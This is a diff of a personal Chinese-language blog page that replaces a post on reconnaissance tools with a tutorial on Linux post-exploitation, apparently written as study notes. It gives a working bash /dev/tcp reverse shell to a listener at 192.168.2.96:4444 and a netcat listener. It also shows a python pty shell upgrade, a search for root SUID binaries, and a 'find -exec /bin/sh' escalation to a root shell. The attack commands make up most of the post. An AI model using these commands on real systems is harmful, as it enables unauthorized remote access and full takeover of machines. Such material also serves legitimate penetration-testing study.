@@ -3,9 +3,9 @@
 <head>
   <meta charset="utf-8">
   <meta name="referrer" content="no-referrer" />
-  <title>信息收集工具 | 个人博客</title>
-  <meta name="keywords" content=" 信息收集 , 工具 ">
-  <meta name="description" content="信息收集工具 | 个人博客">
+  <title>linux提权 | 个人博客</title>
+  <meta name="keywords" content=" 提权 , 维权 , linux ">
+  <meta name="description" content="linux提权 | 个人博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="1 将meterpreter获得的权限，反弹到kail上。1.1 kaill监听端口1nc -nvlp 4444 &#x2F;&#x2F;nc是监听软件，4444是监听端口   1.2 meterpreter获取权限后，将权限反弹出来1bash -c &#x27;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.2.96&#x2F;4444 &lt;&amp;1&#x27; &#x2F;&#x2F;将权限反弹到指定ip">
 <meta property="og:type" content="article">
@@ -600,9 +600,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-2 信息收集工具" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-1 linux维权和提权" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">信息收集工具</h1>
+        <h1 class="article-title">linux提权</h1>
     
     <div class="article-meta">
         
@@ -620,21 +620,23 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">信息收集</a>
+            <a class="color3">提权</a>
             
-            <a class="color3">工具</a>
+            <a class="color3">维权</a>
+            
+            <a class="color1">linux</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2024-07-23 20:45:58'>2024-07-23 20:34</time>
+            发布时间 : <time class="date" title='最后更新: 2024-10-11 11:39:20'>2024-10-11 10:34</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:253</span>
+        <span>字数:1.1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -653,7 +655,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-text">1 网络空间搜索引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-text">2 浏览器搜索引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98%E6%9C%BA"><span class="toc-text">3 子域名挖掘机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-text">4</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B0%86meterpreter%E8%8E%B7%E5%BE%97%E7%9A%84%E6%9D%83%E9%99%90%EF%BC%8C%E5%8F%8D%E5%BC%B9%E5%88%B0kail%E4%B8%8A%E3%80%82"><span class="toc-text">1 将meterpreter获得的权限，反弹到kail上。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-kaill%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-text">1.1 kaill监听端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-meterpreter%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90%E5%90%8E%EF%BC%8C%E5%B0%86%E6%9D%83%E9%99%90%E5%8F%8D%E5%BC%B9%E5%87%BA%E6%9D%A5"><span class="toc-text">1.2 meterpreter获取权限后，将权限反弹出来</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-%E7%A8%B3%E5%9B%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-text">1.3 稳固自己的权限</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8F%90%E5%8D%87%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-text">2 提升自己的权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E7%A7%BB%E5%8A%A8%E5%88%B0tmp%E7%9B%AE%E5%BD%95%EF%BC%8C%E5%9B%A0%E4%B8%BAtmp%E7%9B%AE%E5%BD%95%E6%9C%89%E6%9D%83%E9%99%90%E3%80%82%E5%B9%B6%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6"><span class="toc-text">2.1 移动到tmp目录，因为tmp目录有权限。并创建一个文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E5%AF%BB%E6%89%BE%E5%8F%AF%E4%BB%A5%E6%8F%90%E6%9D%83%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-text">2.2 寻找可以提权的命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-text">2.3 进行提权</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -669,34 +671,63 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <hr>
-<p> 子域名<br>google、空间搜索引擎、情报、爆破<br>ip<br>dns查询，空间搜索引擎、情报<br>端口号<br>google、空间搜索引擎、情报、爆破<br>目录<br>google、空间搜索引擎、情报、爆破<br>指纹<br>goby<br>漏洞扫描<br>漏洞复现  </p>
-<hr>
-<h3 id="1-网络空间搜索引擎"><a href="#1-网络空间搜索引擎" class="headerlink" title="1 网络空间搜索引擎"></a>1 网络空间搜索引擎</h3><ul>
-<li>fofa,zoomeye(东西比较老),鹰图，微步，quaker</li>
-<li>地址</li>
-</ul>
+        <h3 id="1-将meterpreter获得的权限，反弹到kail上。"><a href="#1-将meterpreter获得的权限，反弹到kail上。" class="headerlink" title="1 将meterpreter获得的权限，反弹到kail上。"></a>1 将meterpreter获得的权限，反弹到kail上。</h3><h4 id="1-1-kaill监听端口"><a href="#1-1-kaill监听端口" class="headerlink" title="1.1 kaill监听端口"></a>1.1 kaill监听端口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp <span class="number">4444</span> <span class="comment">//nc是监听软件，4444是监听端口</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584076577-8dc5a9af-4a47-4ab9-b2d0-cbd67a4a686d.png"></p>
+<h4 id="1-2-meterpreter获取权限后，将权限反弹出来"><a href="#1-2-meterpreter获取权限后，将权限反弹出来" class="headerlink" title="1.2 meterpreter获取权限后，将权限反弹出来"></a>1.2 meterpreter获取权限后，将权限反弹出来</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.2.96/4444 &lt;&amp;1&#x27;</span> <span class="comment">//将权限反弹到指定ip地址</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584181405-f6228c06-0936-47c3-904a-4707b55ced4d.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584268726-aee52496-2f22-412a-8d9e-61f9e4e09560.png"></p>
+<h4 id="1-3-稳固自己的权限"><a href="#1-3-稳固自己的权限" class="headerlink" title="1.3 稳固自己的权限"></a>1.3 稳固自己的权限</h4><p>Python 代码 <code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code> 是用来创建一个伪终端（pseudo-terminal）并启动一个新的 bash shell。下面是这段代码的具体意思：</p>
 <ol>
-<li><a target="_blank" rel="noopener" href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a></li>
-<li><a target="_blank" rel="noopener" href="https://fofa.info/toLogin">https://fofa.info/toLogin</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></li>
-<li><a target="_blank" rel="noopener" href="https://x.threatbook.com/">https://x.threatbook.com/</a></li>
-<li><a target="_blank" rel="noopener" href="https://0.zone/">https://0.zone/</a></li>
+<li><code>python -c &#39;...&#39;</code>：这是在命令行中运行 Python 代码的方式。<code>-c</code> 选项表示要执行后面引号中的代码。</li>
+<li><code>import pty</code>：这行代码导入了 Python 的 <code>pty</code> 模块。<code>pty</code> 模块提供了与伪终端相关的功能。</li>
+<li><code>pty.spawn(&quot;/bin/bash&quot;)</code>：这是 <code>pty</code> 模块中的一个函数。<code>spawn</code> 函数启动一个新的子进程，并将其连接到一个伪终端。这里，<code>&quot;/bin/bash&quot;</code> 是要启动的程序，即 bash shell。</li>
 </ol>
-<h3 id="2-浏览器搜索引擎"><a href="#2-浏览器搜索引擎" class="headerlink" title="2 浏览器搜索引擎"></a>2 浏览器搜索引擎</h3><ul>
-<li>google浏览器</li>
-</ul>
-<h3 id="3-子域名挖掘机"><a href="#3-子域名挖掘机" class="headerlink" title="3 子域名挖掘机"></a>3 子域名挖掘机</h3><ul>
-<li>注意不要连接WiFi使用</li>
-</ul>
+<p>这些命令用于配置和恢复终端的行为。下面是对每个命令的具体解释：</p>
 <ol>
-<li>下载位置</li>
+<li><code>stty raw -echo</code>：<ul>
+<li><code>stty</code> 是一个用于配置终端属性的命令。</li>
+<li><code>raw</code> 模式将终端设置为原始模式。在这种模式下，输入的字符不会被处理（例如，不会进行行缓冲、字符转换等），而是直接传递给程序。这种模式常用于需要对每个输入字符进行精细控制的场景。</li>
+<li><code>-echo</code> 选项禁用字符回显。也就是说，输入的字符不会显示在终端上，这在一些需要隐藏输入内容的操作中很有用（例如，输入密码）。</li>
+</ul>
+</li>
+<li><code>fg</code>：<ul>
+<li><code>fg</code> 是用来将后台进程恢复到前台的命令。在你启动了一个进程并将其放到后台后（比如使用 <code>Ctrl+Z</code>），可以用 <code>fg</code> 命令将它带回前台。</li>
+<li>在这个上下文中，<code>fg</code> 可能是为了将之前被放到后台的进程（比如一个被暂停的 shell）恢复到前台，以便继续交互。</li>
+</ul>
+</li>
+<li><code>reset</code>：<ul>
+<li><code>reset</code> 命令用于重置终端到默认状态。这包括恢复终端的各种设置（如输入模式、屏幕显示等），清除任何可能的错误状态，确保终端的正常操作。</li>
+<li>这个命令常用于当终端的显示或输入出现异常时，例如在终端的模式被不小心更改后，使用 <code>reset</code> 来恢复到正常状态。</li>
+</ul>
+</li>
 </ol>
-<p><a target="_blank" rel="noopener" href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86/Layer%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98%E6%9C%BA4.2%E7%BA%AA%E5%BF%B5%E7%89%88.rar">http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86/Layer%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98%E6%9C%BA4.2%E7%BA%AA%E5%BF%B5%E7%89%88.rar</a></p>
-<ol start="2">
-<li>子域名挖掘机是通过枚举法爆破目录，容易死机</li>
-</ol>
-<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>结合在一起，<code>stty raw -echo; fg; reset</code> 的目的可能是：</p>
+<ul>
+<li>将终端切换到原始模式并禁用回显，以进行某种特殊的交互。</li>
+<li>使用 <code>fg</code> 恢复一个之前被放到后台的进程（如一个 shell）到前台。</li>
+<li>使用 <code>reset</code> 来重置终端，以确保所有的终端设置恢复到默认状态。</li>
+</ul>
+<p>这种组合可能用于调试或恢复终端环境，尤其是在交互性和终端配置被破坏或修改的情况下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>   <span class="comment">//先记作固定用法</span></span><br><span class="line">ctrl +z </span><br><span class="line">stty raw -echo;fg;reset</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584463153-c472d14f-6d2e-4b8d-8174-a369c8043590.png"></p>
+<h3 id="2-提升自己的权限"><a href="#2-提升自己的权限" class="headerlink" title="2 提升自己的权限"></a>2 提升自己的权限</h3><h4 id="2-1-移动到tmp目录，因为tmp目录有权限。并创建一个文件"><a href="#2-1-移动到tmp目录，因为tmp目录有权限。并创建一个文件" class="headerlink" title="2.1 移动到tmp目录，因为tmp目录有权限。并创建一个文件"></a>2.1 移动到tmp目录，因为tmp目录有权限。并创建一个文件</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">touch <span class="number">1</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584639753-87608500-4599-4b9f-9ea3-a684498c3a6d.png"></p>
+<h4 id="2-2-寻找可以提权的命令"><a href="#2-2-寻找可以提权的命令" class="headerlink" title="2.2 寻找可以提权的命令"></a>2.2 寻找可以提权的命令</h4><ul>
+<li><code>**-perm -4000**</code>：这个选项用于查找具有特定权限的文件。<code>4000</code> 是一个八进制数，表示设置了 <code>setuid</code> 位（也称为 “set user ID” 位）的文件。<code>setuid</code> 位允许文件在执行时以文件所有者的权限运行，而不是执行者的权限。<code>-</code> 表示要匹配具有该权限位的文件，<code>4000</code> 表示具体的权限位。</li>
+<li><code>**-print**</code>：这个选项用于打印找到的文件路径。</li>
+<li><code>**2&gt;/dev/null**</code>：这是一个重定向操作。<code>2&gt;</code> 用于将标准错误输出（文件描述符 2）重定向到 <code>/dev/null</code>，一个特殊的文件，丢弃所有写入的数据。这样做可以将错误信息（如权限问题或不可访问的目录）隐藏起来，不显示在终端上。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;/dev/<span class="literal">null</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722585283689-67ed8977-1087-471d-ac49-dbbb76fa842e.png"></p>
+<h4 id="2-3-进行提权"><a href="#2-3-进行提权" class="headerlink" title="2.3 进行提权"></a>2.3 进行提权</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /tmp -name <span class="number">1</span> -exec <span class="string">&quot;/bin/sh&quot;</span>  \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584836795-b45026c4-9849-4082-a2cf-b7fefe17e3fa.png"></p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
     </div>
